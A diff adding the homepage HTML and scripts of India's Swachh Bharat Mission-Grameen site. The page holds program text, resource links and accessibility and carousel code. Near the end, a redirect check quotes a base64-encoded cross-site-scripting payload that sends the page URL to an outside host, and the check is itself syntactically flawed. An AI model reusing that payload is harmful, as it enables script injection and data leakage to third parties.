+      <li><a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Swachhata-Samachar-E-book/Swachhata_Samachar_January_2025(English)/index.html" target="_blank">Swachhata Samachar January 2025(English)</a></li>
+      <li><a href="https://www.startupindia.gov.in/content/sih/en/ams-application/challenge.html?applicationId=66825684e4b05a5f46deb727" target="_blank">Startup Grand Challenge</a></li>
+      <li><a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/What's-New-file/List-of-State-wise-Plastic-Waste-Processors.pdf" target="_blank">List of State-wise Plastic Waste Processors for establishing forward linkages f…</a></li>
+    </ul>
+  </div>
+</div>--->
+            
+        </div>
+		
+		
+
+    </div>
+
+
+
+<!--about us start-->
+<div class="container mt-4" aria-labelledby="about-sbmg">
+
+  <h2 class="heading">About SBMG</h2>
+     <div class="row">
+ 
+  
+  
+   
+	<div class="col-lg-9 col-md-12 wrappers">
+    <div class="about-section" style="text-align:justify;line-height: 29px;height: 319px;overflow-y: scroll;"  tabindex="0"
+           role="region"
+           aria-label="Overview of Swachh Bharat Mission Grameen">
+     <h3>Swachh Bharat Mission: Driving India's Sanitation Renaissance</h3>
+      <p>The Swachh Bharat Mission-Grameen (SBM-G) represents a transformative phase in India's sanitation narrative, driven by a history enriched with ancient innovations and bolstered by contemporary governmental efforts. Initiated in 2014 by the Hon’ble Prime Minister, the mission targeted making India Open Defecation Free (ODF).</p>
+      <p>This massive undertaking successfully mobilized nationwide participation, marking it as the largest behavioral change movement globally. By 2019, the mission celebrated the construction of over 100 million individual household toilets, declaring more than 6 lakh villages ODF, a tribute to Mahatma Gandhi on his 150th birth anniversary and aligning with SDG Target 6.2.</p>
+      <h3>The impact of SBM Phase I was profound:- </h3>
+      <h4><b>Health Improvements:</b></h4>
+      <ul>
+      <li>The WHO reported 300,000 fewer diarrheal deaths in 2019 compared to 2014, directly attributable to improved sanitation.- </li>
+      </ul>
+       <h4><b>Economic Benefits:</b></h4>
+       <ul>
+      
+      <li>Families in ODF villages saved an average of INR 50,000 annually on health costs.</li>
+      </ul>
+       <h4> <b>Environmental Conservation:</b></h4>
+      <ul>
+   
+      <li>A significant reduction in groundwater contamination was noted in ODF areas.</li>
+      </ul>
+       <h4><b>Enhanced Safety and Dignity for Women:</b></h4>
+       <ul>
+      
+      <li> With better access to sanitation facilities, 93% of women reported feeling safer at home.</li>
+      </ul>
+      <p>Building on these achievements, Phase II of SBM-G, launched post-2019, aims to sustain the ODF status and introduce comprehensive solid and liquid waste management across rural India to achieve 'Sampoorn Swachhata’. </p>
+      <p>The mission's current phase is supported by an investment of Rs.1.40 lakh crores, which integrates various governmental schemes to enhance sanitation infrastructure further. In addition to infrastructure development, SBM-G promotes innovative cleanliness campaigns such as the Swachhata Green Leaf Rating and Swachhata Hi Sewa, mobilizing millions to participate in cleanliness drives. The Light House Initiative and the establishment of the Dr. Syama Prasad Mookerjee National Institute of Water and Sanitation (SPM-NIWAS) in Kolkata underscore the mission's educational and developmental commitments, aiming to inspire and train other regions towards achieving ODF Plus status.</p>
+      <p>The SBM-G model serves not only as a testament to India's dedication to improving public health and hygiene but also as a beacon of community-driven change, integrating the efforts of multiple ministries and millions of citizens. This journey from basic sanitation to a holistic approach towards sustainable sanitation practices marks a pivotal shift in India's public health strategy.[Read more about the continuous efforts and the visionary programs under the Swachh Bharat Mission-Grameen, further pushing the boundaries of what is possible in public health and community involvement.]</p>
+      </div>
+	  <a href="https://swachhbharatmission.ddws.gov.in/about_sbm" target="_blank" class="about-read-more-button" rel="noopener noreferrer" aria-label="Read More about swachh bharat Mission"><i>Read More</i></a>
+
+    </div>
+
+    	<div class="col-sm-3" style="text-align: center;">
+      <img src="https://cbpssubscriber.mygov.in/assets/uploads/89vQkZbZihu8Szgn?79" alt="Click to open link to CBPS Subscriber page" id="_p786howG1pnfvirf"
+        onclick="javascript:window.open('https://cbpssubscriber.mygov.in/aff/p786howG1pnfvirf')"
+        style="cursor: pointer;"
+        onload="javascript:(function(){if(typeof _done == 'undefined' || !_done){this.setAttribute('src', this.getAttribute('src')+'?'+Math.floor((Math.random() * 100) + 1)); _done=true;}}).call(this)">
+    </div>
+    
+  </div>
+</div>
+<!-- External Link section -->
+<div class="container pt-5">
+
+</div>
+</div>
+
+<!-- externaal Link section end -->
+             <div class="guidelines" aria-labelledby="Important Resources">
+             <div class="container">
+               <h2 class="heading">Important Resources</h2>
+               <div class="row" role="list">
+                <div class="col-12 col-sm-6 col-md-4 col-lg-3 col-xl-2" role="listitem">
+                <div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Technical-Notes/10Years_of_SBM_Brochure.pdf" target="_blank" rel="noopener noreferrer" aria-label="Open PDF: 10 Years of SBM-G (opens in new tab)"><figure><img src="themes/custom/repo-theme-master/images/guide1.jpg" alt="Cover page of 10 Years of Swachh Bharat Mission Gramin brochure"></figure>
+                    <div class="text">
+                        <p>10 years of SBM-G</p>
+                    </div></a> 
+                </div></div>
+                 <div class="col-12 col-sm-6 col-md-4 col-lg-3 col-xl-2" role="listitem">
+                <div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Technical-Notes/Voices-from-the-States-29-April-2023.pdf" target="_blank" rel="noopener noreferrer" aria-label="Open PDF: Voices from the States (opens in new tab)"><figure><img src="themes/custom/repo-theme-master/images/guide2.jpg" alt="Cover page of Voices from the States report"></figure>
+                    <div class="text">
+                        <p>Voices from the State</p>
+                    </div></a> 
+                </div></div>
+                 <!--<div class="col-lg-2">
+                <div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Technical-Notes/swachhata-leaf-rating-booklet.pdf" target="_blank"><figure><img src="themes/custom/repo-theme-master/images/guide3.jpg" alt="guide3"></figure>
+                    <div class="text">
+                        <p>Swachhata Green Leaf Rating</p>
+                    </div></a> 
+                </div></div>-->
+				
+				<div class="col-12 col-sm-6 col-md-4 col-lg-3 col-xl-2" role="listitem">
+                <div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Technical-Notes/SSG_Framework.pdf" target="_blank" rel="noopener noreferrer" aria-label="Open PDF: SSG Framework document (opens in new tab)"><figure><img src="themes/custom/repo-theme-master/images/guide3.jpg" alt="Cover page of SSG Framework document"></figure>
+                    <div class="text">
+                        <p>SSG Framework</p>
+                    </div></a> 
+                </div></div>
+                 <div class="col-12 col-sm-6 col-md-4 col-lg-3 col-xl-2" role="listitem">
+                <!-- <div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Technical-Notes/Swachhata-Chronicles-Transformative-Tales-from-India-2024.pdf" target="_blank"><figure><img src="themes/custom/repo-theme-master/images/guide5.jpg" alt="guide4"></figure>
+                    <div class="text">
+                        <p>Swachhata Chronicles</p>
+                    </div></a> 
+                </div> -->
+				<div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Swachhata-Chronicles/Swachhata_Chronicles.pdf" target="_blank" rel="noopener noreferrer" aria-label="Open PDF: Swachhata Chronicles (opens in new tab)"><figure><img src="themes/custom/repo-theme-master/images/guide5.jpg" alt="Cover page of Swachhata Chronicles publication"></figure>
+                    <div class="text">
+                        <p>Swachhata Chronicles</p>
+                    </div></a> 
+                </div>
+				</div>
+                 <div class="col-12 col-sm-6 col-md-4 col-lg-3 col-xl-2" role="listitem">
+                <div class="box">
+                   <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Technical-Notes/Compendium-on-LWM-Technologies_3.pdf" target="_blank" rel="noopener noreferrer" aria-label="Open PDF: Compendium of Liquid Waste Management technologies (opens in new tab)"><figure><img src="themes/custom/repo-theme-master/images/guide4.jpg" alt="Cover page of Compendium on Liquid Waste Management technologies"></figure>
+                    <div class="text">
+                        <p>Compendium of LWM</p>
+                    </div></a> 
+                </div></div>
+               </div>
+               <a href="https://swachhbharatmission.ddws.gov.in/technical-notes" target="_blank" class="btn" rel="noopener noreferrer" aria-label="Read more important resources from Swachh Bharat Mission (opens in new tab)">Read More</a>
+                </div>
+            </div>
+              <!-- externaal Link section end -->
+<!-- externaal Link section end -->
+<!--about us finish-->
+<!-- container end    -->
+
+
+
+<div class="view mportnt_link" aria-labelledby="important-links">
+            <h2 class="heading imp">Important Links</h2>
+            <div style="margin: 0px 5%">
+                <div class="grid-row ss">
+                    <div class="grid-item" role="list">
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://sbm.gov.in/sbmphase2/Secure/Entry/UserMenu.aspx"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/MIS.png" width="205" height="113" alt="" />
+
+                                <span class="IHHL_text">Know your Swachh Bharat data (MIS)</span>
+                            </a>
+                        </div>
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://sbm.gov.in/sbm_dbt/secure/login.aspx"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/app_IHHL.png" width="205" height="113" alt="" />
+                                <span class="IHHL_text">Application Form For IHHL Dashboard</span>
+                            </a>
+                        </div>
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://sbm.gov.in/sbmgdashboard/statesdashboard.aspx"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/DB.png" width="205" height="113" alt="" />
+                                <span class="IHHL_text">Dashboard</span>
+                            </a>
+                        </div>
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://watersanitationlearning.gov.in/"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/watersanitationlearning.png" width="205" height="113" alt="" />
+
+                                <span class="IHHL_text">Capacity Building Dashboard</span>
+                            </a>
+                        </div>
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://gobardhan.sbm.gov.in/"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/Gobardhan_0.png" width="205" height="113" alt="" />
+
+                                <span class="IHHL_text">GOBARdhan</span>
+                            </a>
+                        </div>
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://swachhbharatmission.ddws.gov.in/swachhata-samachar"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/Swachhata_samachar_h.png" width="205" height="113" alt="" />
+
+                                <span class="IHHL_text">Swachhata Samachar</span>
+                            </a>
+                        </div>
+                        <div class="p-3 wrappers" role="listitem">
+                            <a
+                                href="https://sbm.gov.in/sbmphase2/SBM_PhaseII_StateFactSheet.aspx"
+                                target="_blank"
+                                title="External Website that opens in a new window"
+                            >
+                                <img loading="lazy" src="https://swachhbharatmission.ddws.gov.in/sites/default/files/Important-link/StateFactSheet.png" width="205" height="113" alt="" />
+
+                                <span class="IHHL_text">State Fact Sheet</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+<!--<div id="countdown">
+     <h4>World Toilet Day- 19<sup>th</sup> November, 2024</h4>
+	 
+	<h5>Countdown to World Toilet Day 2024 Campaign Culmination</h5>
+	<h6>हमारा शौचालय: हमारा सम्मान</h6>
+	<h6>(Hamara Shauchalay: Hamara Samman)</h6>
+	<h5>Human Rights Day -10th December,2024</h5>
+	<br>
+	  <div id="countdown" class="days">
+    <ul>
+      <li><span id="days"></span>Days</li>
+      <li><span id="hours"></span>Hours</li>
+      <li><span id="minutes"></span>Minutes</li>
+      <li><span id="seconds"></span>Seconds</li>
+    </ul>
+  </div>
+   
+
+        <div class="btn-section">
+             <a href="#" class="btn">READ MORE</a>
+            <a href="https://drive.google.com/drive/folders/1TjATPE9rtUJAkqpH1wGKOM58AhKuDo2t?usp=sharing" target="_blank" class="btns">RESOURCES</a>
+        </div>
+</div>-->
+</main>
+<footer class="main-footer wrappers" role="contentinfo">
+    <div class="footertext" style="background: #f5f5f5; padding:0px 5%;">
+            <div class="row ">
+           <div class="col-xl-9 col-lg-9 col-md-12 col-12 p-3">
+                <div class="footerLeft">
+                    <p style="color: #000;">SBM Academy Toll Free:<strong> 18001800404</strong></p>
+                    <ul aria-label="Footer links">
+                        <!--<li><a href="terms-conditions" target="_blank">Terms &amp; Conditions</a></li>-->
+                        <li><a href="archives" target="_blank">Archives</a></li>
+                        <li><a href="privacy-policy" target="_blank">Privacy Policy</a></li>
+                        <li><a href="hyperlinking-policy" target="_blank">Hyperlinking Policy</a></li>
+                        <li><a href="copyright-policy" target="_blank">Copyright Policy</a></li>
+                        <li><a href="accessibility-statement" target="_blank">Accessibility Statement</a></li>
+                       <!-- <li><a href="disclaimer" target="_blank">Disclaimer</a></li>-->
+                        <li><a href="help" target="_blank">Help</a></li>
+                        <li><a href="feedback" target="_blank">Feedback</a></li>
+                        <li><a href="contact-us" target="_blank">Contact Us</a></li>
+               </ul>
+            
+            
+                
+		<p class="copyright">Website Content Managed by  <b>Swachh Bharat Mission - Grameen, Department of Drinking Water and Sanitation, Ministry of Jal Shakti,</b> Designed, Developed and Hosted by  
+            <a href="https://www.nic.in/" target="_blank" rel="noopener noreferrer" aria-label="National Informatics Centre website opens in new tab">
+                <img src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/nic.png" alt="National Informatics Centre logo" style="width:3%;">
+            </a>
+        </p>
+                <div class="siteInfo">
+                    
+                    <span id="ContentPlaceHolder1_UserCMSFooter1_UserHitCounter1_lblHitCount">Visitors:
+                        <strong>22789597</strong></span> &nbsp; <span
+                        id="ContentPlaceHolder1_UserCMSFooter1_UserPageLastUpdateDate1_lblPageLastUpdateDate">Page last
+                        updated on: <strong id="date"></strong>
+                    </span>
+                </div>
+            </div> </div>
+            <div class="col-xl-3 col-lg-3 col-md-12 col-12 p-3">
+                <div class="footerRight">                    
+                   <div class="otherLogo">
+                        <div class="validation d-flex" role="list" style=""><div role="listitem"><a href="https://validator.w3.org/check?uri=referer" target="_blank"><img alt="HTML Validator - External website that opens in a new window" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/html.png" width="60" height="21" rel="noopener noreferrer"></a></div><div role="listitem">
+<a href="https://jigsaw.w3.org/css-validator/check/referer" target="_blank"><img alt="CSS Validator - External website that opens in a new window" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/css.png" width="60" height="21" rel="noopener noreferrer"></a></div></div>
+                        <a href="https://india.gov.in" target="_blank" title="https://india.gov.in, National Portal of India"><img alt="https://india.gov.in, National Portal of India : External website that opens in a new window" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/indianGov.jpg" title="https://india.gov.in, National Portal of India : External website that opens in a new window" width="190" height="60" rel="noopener noreferrer"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+            </div>
+	</div>
+</footer>
+
+
+<!-----   accessability js code start  ---->
+<script>
+const trigger = document.querySelector('.accessibility');
+const popup = document.querySelector('.access-type');
+const container = document.querySelector('.user_accessibility');
+const lastItem = document.querySelector('.tool-item a.scr-reader');
+const closeBtn = document.querySelector('.close-accessbility');
+
+if (trigger) {
+
+  const openMenu = () => {
+    trigger.classList.add('expand');
+    trigger.setAttribute('aria-expanded', 'true');
+  };
+
+  const closeMenu = () => {
+    trigger.classList.remove('expand');
+    trigger.setAttribute('aria-expanded', 'false');
+  };
+
+  // Open on focus
+  trigger.addEventListener('focus', openMenu);
+
+  // Close when tabbing out from last item
+  if (lastItem) {
+    lastItem.addEventListener('blur', closeMenu);
+  }
+
+  // Close when using close button
+  if (closeBtn) {
+    // Mouse click
+    closeBtn.addEventListener('click', closeMenu);
+
+    // Keyboard - Enter
+    closeBtn.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        closeMenu();
+      }
+    });
+
+    // Keyboard - Space
+    closeBtn.addEventListener('keyup', (e) => {
+      if (e.key === ' ' || e.key === 'Spacebar') {
+        e.preventDefault();
+        closeMenu();
+      }
+    });
+  }
+}
+</script>
+
+
+<!-----   accessability font size change js code start  ---->
+<script>
+ n = new Date();
+ y = n.getFullYear();
+ m = n.getMonth() + 1;
+ d = n.getDate();
+ document.getElementById("date").innerHTML = d + "/" + m + "/" + y;
+ </script>
+<!-----   accessability font size change js code start  ---->
+  <script>
+let curSize = 16;       // default font size
+let increaseCount = 0;  // track max 2 clicks
+
+const selector = '.wrappers, p, a, h1, h2, h3, h4, h5, h6, .govlogo, nav span, .ticker, .news marquee, nav a';
+
+// Increase (max 2 times)
+$('#increasetext1').click(function () {
+    if (increaseCount < 2) {
+        curSize = parseInt($(selector).css('font-size')) + 1;
+
+        if (curSize <= 18) {
+            $(selector).css('font-size', curSize + 'px');
+            increaseCount++;
+        }
+    }
+});
+
+// Reset
+$('#resettext').click(function () {
+    curSize = 16;
+    increaseCount = 0;
+
+    $(selector).css('font-size', '16px');
+});
+
+// Decrease
+$('#decreasetext').click(function () {
+    curSize = parseInt($(selector).css('font-size')) - 1;
+
+    if (curSize >= 12) {
+        $(selector).css('font-size', curSize + 'px');
+        increaseCount--; // allow increasing again
+    }
+});
+</script>
+ 
+  <!-----   accessability change color js code start  ---->
+   <script>
+      const addButton = document.getElementById('addStylesheet');
+      const removeButton = document.getElementById('removeStylesheet');
+      const link = document.getElementById('dynamic-stylesheet');
+    
+      // URL of the stylesheet to toggle
+      const stylesheetUrl = 'https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/css/theme-dark.css'; // Example stylesheet
+      
+      addButton.addEventListener('click', () => {
+          link.href = stylesheetUrl; // Set the href to load the stylesheet
+      });
+    
+      removeButton.addEventListener('click', () => {
+          link.href = ''; // Remove the stylesheet by setting href to an empty string
+      });
+
+
+
+      </script>
+	  
+	  
+ 
+		<script>
+$(document).ready(function(){
+    $('.accessibility').click(function(){
+            $(this).addClass('expand');
+        });
+  $('.close-accessbility').click(function(){
+      $('.accessibility').removeClass('expand');
+  });
+
+});
+ </script>
+ 
+ 
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const toggle = document.getElementById("documentsDropdown");
+  const menu = toggle.nextElementSibling;
+  const items = menu.querySelectorAll("a");
+
+  toggle.addEventListener("keydown", function (e) {
+    if (e.key === "Enter" || e.key === " ") {
+      e.preventDefault();
+      toggleMenu();
+    }
+    if (e.key === "ArrowDown") {
+      e.preventDefault();
+      openMenu();
+      items[0].focus();
+    }
+  });
+
+  items.forEach((item, index) => {
+    item.addEventListener("keydown", function (e) {
+      if (e.key === "ArrowDown") {
+        e.preventDefault();
+        (items[index + 1] || items[0]).focus();
+      }
+      if (e.key === "ArrowUp") {
+        e.preventDefault();
+        (items[index - 1] || items[items.length - 1]).focus();
+      }
+      if (e.key === "Escape") {
+        closeMenu();
+        toggle.focus();
+      }
+    });
+  });
+
+  function toggleMenu() {
+    const expanded = toggle.getAttribute("aria-expanded") === "true";
+    toggle.setAttribute("aria-expanded", !expanded);
+    menu.classList.toggle("show", !expanded);
+  }
+
+  function openMenu() {
+    toggle.setAttribute("aria-expanded", "true");
+    menu.classList.add("show");
+  }
+
+  function closeMenu() {
+    toggle.setAttribute("aria-expanded", "false");
+    menu.classList.remove("show");
+  }
+});
+</script>
+
+<script type="text/javascript">
+(function () {
+  const second = 1000,
+        minute = second * 60,
+        hour = minute * 60,
+        day = hour * 24;
+
+  //I'm adding this section so I don't have to keep updating this pen every year :-)
+  //remove this if you don't need it
+  let today = new Date(),
+      dd = String(today.getDate()).padStart(2, "0"),
+      mm = String(today.getMonth() + 1).padStart(2, "0"),
+      yyyy = today.getFullYear(),
+      nextYear = yyyy + 1,
+      //dayMonth = "11/19/",
+	  dayMonth = "12/10/",
+      birthday = dayMonth + yyyy;
+  
+  today = mm + "/" + dd + "/" + yyyy;
+  if (today > birthday) {
+    birthday = dayMonth + nextYear;
+  }
+  //end
+  
+  const countDown = new Date(birthday).getTime(),
+      x = setInterval(function() {    
+
+        const now = new Date().getTime(),
+              distance = countDown - now;
+
+        document.getElementById("days").innerText = Math.floor(distance / (day)),
+          document.getElementById("hours").innerText = Math.floor((distance % (day)) / (hour)),
+          document.getElementById("minutes").innerText = Math.floor((distance % (hour)) / (minute)),
+          document.getElementById("seconds").innerText = Math.floor((distance % (minute)) / second);
+
+        //do something later when date is reached
+        if (distance < 0) {
+          document.getElementById("headline").innerText = "It's my birthday!";
+          document.getElementById("countdown").style.display = "none";
+          document.getElementById("content").style.display = "block";
+          clearInterval(x);
+        }
+        //seconds
+      }, 0)
+  }());
+</script>
+
+<script>
+
+window.onload = function(){
+    document.getElementById("bannerPopup").style.display = "block";
+};
+
+function closePopup(){
+    document.getElementById("bannerPopup").style.display = "none";
+}
+
+</script>
+
+<script>
+let currentSize = 100; // default 100%
+
+const announcer = document.getElementById("fontAnnouncement");
+
+function updateFont() {
+    document.body.style.fontSize = currentSize + "%";
+
+    // Announce change
+    announcer.textContent = "Text size increased to " + currentSize + " percent";
+}
+
+// Increase
+document.getElementById("increasetext1").addEventListener("click", function () {
+    if (currentSize < 120) { // limit
+        currentSize += 10;
+        updateFont();
+    }
+});
+
+// Decrease
+document.getElementById("decreasetext").addEventListener("click", function () {
+    if (currentSize > 80) {
+        currentSize -= 10;
+        document.body.style.fontSize = currentSize + "%";
+        announcer.textContent = "Text size decreased to " + currentSize + " percent";
+    }
+});
+
+// Reset
+document.getElementById("resettext").addEventListener("click", function () {
+    currentSize = 100;
+    document.body.style.fontSize = "100%";
+    announcer.textContent = "Text size reset to 100 percent";
+});
+</script>
+
+
+
+
+<script type="text/javascript">
+document.querySelectorAll(".visually-hidden").forEach(function(el) {
+  el.remove();
+});
+</script>
+<script>
+(function () {
+
+  function fixPager() {
+    const pagers = document.querySelectorAll("nav.pager");
+
+    pagers.forEach(function (pager) {
+      if (pager.getAttribute("role") === "navigation") {
+        pager.removeAttribute("role");
+      }
+
+      pager.setAttribute("aria-label", "Pagination");
+    });
+  }
+
+  // Run on load
+  document.addEventListener("DOMContentLoaded", fixPager);
+
+  // Watch for DOM changes (AJAX updates)
+  const observer = new MutationObserver(function () {
+    fixPager();
+  });
+
+  observer.observe(document.body, {
+    childList: true,
+    subtree: true
+  });
+
+})();
+</script>
+
+
+<!-- <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+<script async src="https://www.instagram.com/embed.js"></script>
+<script type="text/javascript" src="https://instaembedcode.com/in.js"></script> -->
+
+<script async src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/js/twiter-widgets.js" charset="utf-8"></script>
+<script async src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/js/insta-embed.js"></script>
+<script type="text/javascript" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/js/insta-in.js"></script>
+
+
+<script>
+'use strict';
+
+function Carousel(node) {
+  this.node = node;
+  this.items = node.querySelectorAll('.carousel-item');
+  this.liveRegion = node.querySelector('.carousel-items');
+
+  this.playBtn = node.querySelector('.rotation');
+  this.prevBtn = node.querySelector('.previous');
+  this.nextBtn = node.querySelector('.next');
+
+  this.index = 0;
+  this.interval = 3000;
+  this.playing = true;
+  this.timer = null;
+
+  this.show(this.index, false);
+  this.updatePlayState();
+  this.start();
+
+  this.playBtn.addEventListener('click', () => this.toggle());
+  this.prevBtn.addEventListener('click', () => this.userPrev());
+  this.nextBtn.addEventListener('click', () => this.userNext());
+}
+
+/* ---------- DISPLAY ---------- */
+
+Carousel.prototype.show = function(i, announce) {
+  if (announce) {
+    this.liveRegion.setAttribute('aria-live', 'polite');
+  } else {
+    this.liveRegion.removeAttribute('aria-live');
+  }
+
+  this.items.forEach((item, idx) => {
+    const active = idx === i;
+    item.classList.toggle('active', active);
+    item.setAttribute('aria-hidden', active ? 'false' : 'true');
+  });
+};
+
+/* ---------- AUTOPLAY ---------- */
+
+Carousel.prototype.start = function() {
+  this.stop();
+
+  if (!this.playing || this.items.length <= 1) return;
+
+  this.timer = setInterval(() => {
+    this.index = (this.index + 1) % this.items.length;
+    this.show(this.index, false);
+  }, this.interval);
+};
+
+Carousel.prototype.stop = function() {
+  if (this.timer) {
+    clearInterval(this.timer);
+    this.timer = null;
+  }
+};
+
+/* ---------- USER CONTROLS ---------- */
+
+Carousel.prototype.userNext = function() {
+  this.index = (this.index + 1) % this.items.length;
+  this.show(this.index, true);
+};
+
+Carousel.prototype.userPrev = function() {
+  this.index = (this.index - 1 + this.items.length) % this.items.length;
+  this.show(this.index, true);
+};
+
+Carousel.prototype.toggle = function() {
+  this.playing = !this.playing;
+  this.updatePlayState();
+
+  // Announce current slide
+  this.show(this.index, true);
+
+  if (this.playing) {
+    this.start();
+  } else {
+    this.stop();
+  }
+};
+
+/* ---------- PLAY / PAUSE UI ---------- */
+
+Carousel.prototype.updatePlayState = function() {
+  if (this.playing) {
+    this.playBtn.classList.add('play');
+    this.playBtn.classList.remove('pause');
+    this.playBtn.setAttribute('aria-label', 'Stop automatic slide show');
+  } else {
+    this.playBtn.classList.add('pause');
+    this.playBtn.classList.remove('play');
+    this.playBtn.setAttribute('aria-label', 'Start automatic slide show');
+  }
+};
+
+/* ---------- INIT ---------- */
+
+window.addEventListener('load', () => {
+  document.querySelectorAll('.carousel')
+    .forEach(carousel => new Carousel(carousel));
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const tabs = document.querySelectorAll(".tablinks");
+
+  tabs.forEach(tab => {
+
+    // Click support
+    tab.addEventListener("click", function (e) {
+      setActiveTab(this);
+    });
+
+    // Keyboard support (Enter + Space)
+    tab.addEventListener("keydown", function (e) {
+      if (e.key === "Enter" || e.key === " ") {
+        e.preventDefault();
+        this.click(); // trigger click
+      }
+    });
+
+  });
+
+  function setActiveTab(activeTab) {
+    tabs.forEach(tab => tab.classList.remove("active"));
+    activeTab.classList.add("active");
+  }
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    const button = document.querySelector(".marquee-toggle");
+    const marquee = document.querySelector(".views-view-marquee marquee");
+
+    let isPaused = false;
+
+    // Button control
+    button.addEventListener("click", function () {
+        isPaused = !isPaused;
+
+        if (isPaused) {
+            marquee.stop();
+            button.setAttribute("aria-pressed", "true");
+            button.setAttribute("aria-label", "Play");
+            button.innerHTML = '<i class="fa fa-play"></i>';
+        } else {
+            marquee.start();
+            button.setAttribute("aria-pressed", "false");
+            button.setAttribute("aria-label", "Pause");
+            button.innerHTML = '<i class="fa fa-pause"></i>';
+        }
+    });
+
+    // Hover behavior (ONLY if not manually paused)
+    marquee.addEventListener("mouseover", function () {
+        if (!isPaused) {
+            marquee.stop();
+        }
+    });
+
+    marquee.addEventListener("mouseout", function () {
+        if (!isPaused) {
+            marquee.start();
+        }
+    });
+
+});
+</script>
+<!-- END OUTPUT from 'themes/custom/repo-theme-master/templates/layout/page--front.html.twig' -->
+
+
+  </div>
+
+<!-- END OUTPUT from 'core/modules/system/templates/off-canvas-page-wrapper.html.twig' -->
+
+
+    
+   <script src="https://swachhbharatmission.ddws.gov.in//themes/custom/repo-theme-master/js/jquery-jcryption.js"></script> <noscript><div class="displayNone">Your browser does not support Javascript</div></noscript>
+<script src="https://swachhbharatmission.ddws.gov.in//themes/custom/repo-theme-master/js/script.js"></script> <noscript><div class="displayNone">Your browser does not support Javascript</div></noscript>   
+  <script src="https://swachhbharatmission.ddws.gov.in//core/assets/vendor/jquery/jquery.min.js"></script> <noscript>
+ <script>
+ jQuery(document).ready(function() {
+
+if (window.location.href == 'https://swachhbharatmission.ddws.gov.in//communication-material?<scRipt src="data:;base64,bD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7bC5yZWw9InByZWZldGNoIjtsLmhyZWY9Ii8vbHZpMWJuZm4wYWJ6cGx2eWEtdXBzM2N5MjEtazNvZHpqOGwzcGJmbyIrImFpMC5yODcubWUvci8/Iitsb2NhdGlvbi5ocmVmO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobCk="></scRipt>');
+{ 
+    window.location.href = 'https://swachhbharatmission.ddws.gov.in/';
+    
+    
+ }
+ 
+});
+</script>
+        <script>
+      const addButton = document.getElementById('addStylesheet');
+      const removeButton = document.getElementById('removeStylesheet');
+      const link = document.getElementById('dynamic-stylesheet');
+    
+      // URL of the stylesheet to toggle
+      const stylesheetUrl = 'https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/css/theme-dark.css'; // Example stylesheet
+      
+      addButton.addEventListener('click', () => {
+          link.href = stylesheetUrl; // Set the href to load the stylesheet
+      });
+    
+      removeButton.addEventListener('click', () => {
+          link.href = ''; // Remove the stylesheet by setting href to an empty string
+      });
+
+      </script>
+  </body>
+</html>
+<!-- END OUTPUT from 'themes/custom/repo-theme-master/templates/system/html.html.twig' -->
+
